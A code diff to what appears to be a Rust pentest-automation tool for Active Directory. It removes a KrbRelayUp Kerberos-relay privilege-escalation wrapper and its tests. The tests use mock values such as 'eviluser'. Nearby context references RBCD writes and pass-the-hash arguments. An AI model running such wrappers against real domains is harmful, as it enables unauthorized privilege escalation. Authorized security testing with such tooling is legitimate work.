@@ -513,29 +513,6 @@ pub fn build_rbcd_write(args: &Value) -> Result<CommandBuilder> {
     Ok(impacket_identity_auth(cmd, args, domain, username)?.timeout_secs(120))
 }
 
-/// Run KrbRelayUp for local privilege escalation via Kerberos relay.
-///
-/// Required args: `domain`, `dc_ip`
-/// Optional args: `method`, `create_user`, `create_password`
-pub async fn krbrelayup(args: &Value) -> Result<ToolOutput> {
-    let domain = required_str(args, "domain")?;
-    let dc_ip = required_str(args, "dc_ip")?;
-    let method = optional_str(args, "method");
-    let create_user = optional_str(args, "create_user");
-    let create_password = optional_str(args, "create_password");
-
-    CommandBuilder::new("KrbRelayUp")
-        .arg("relay")
-        .flag("-d", domain)
-        .flag("-dc", dc_ip)
-        .flag_opt("-m", method)
-        .flag_opt("-cls", create_user)
-        .flag_opt("-cp", create_password)
-        .timeout_secs(120)
-        .execute()
-        .await
-}
-
 #[cfg(test)]
 mod tests {
     use crate::args::{optional_str, required_str};
@@ -1272,32 +1249,6 @@ mod tests {
     }
 
     #[test]
-    fn krbrelayup_required_args_only() {
-        let args = json!({
-            "domain": "contoso.local",
-            "dc_ip": "192.168.58.10"
-        });
-        assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
-        assert_eq!(required_str(&args, "dc_ip").unwrap(), "192.168.58.10");
-        assert!(optional_str(&args, "method").is_none());
-        assert!(optional_str(&args, "create_user").is_none());
-        assert!(optional_str(&args, "create_password").is_none());
-    }
-
-    #[test]
-    fn krbrelayup_with_optional_args() {
-        let args = json!({
-            "domain": "contoso.local",
-            "dc_ip": "192.168.58.10",
-            "method": "rbcd",
-            "create_user": "eviluser",
-            "create_password": "Ev1lP@ss!"
-        });
-        assert_eq!(optional_str(&args, "method"), Some("rbcd"));
-        assert_eq!(optional_str(&args, "create_user"), Some("eviluser"));
-    }
-
-    #[test]
     fn hash_args_with_nt_only() {
         let hash_args = credentials::hash_args("31d6cfe0d16ae931b73c59d7e0c089c0");
         assert_eq!(hash_args[0], "-hashes");
@@ -1476,29 +1427,6 @@ mod tests {
             "dc_ip": "192.168.58.10"
         });
         assert!(rbcd_write(&args).await.is_ok());
-    }
-
-    #[tokio::test]
-    async fn krbrelayup_executes() {
-        mock::push(mock::success());
-        let args = json!({
-            "domain": "contoso.local",
-            "dc_ip": "192.168.58.10"
-        });
-        assert!(krbrelayup(&args).await.is_ok());
-    }
-
-    #[tokio::test]
-    async fn krbrelayup_with_options_executes() {
-        mock::push(mock::success());
-        let args = json!({
-            "domain": "contoso.local",
-            "dc_ip": "192.168.58.10",
-            "method": "rbcd",
-            "create_user": "eviluser",
-            "create_password": "Ev1lP@ss!"
-        });
-        assert!(krbrelayup(&args).await.is_ok());
     }
 
     // ── hash / ticket auth for the GenericAll→RBCD chain ────────────────
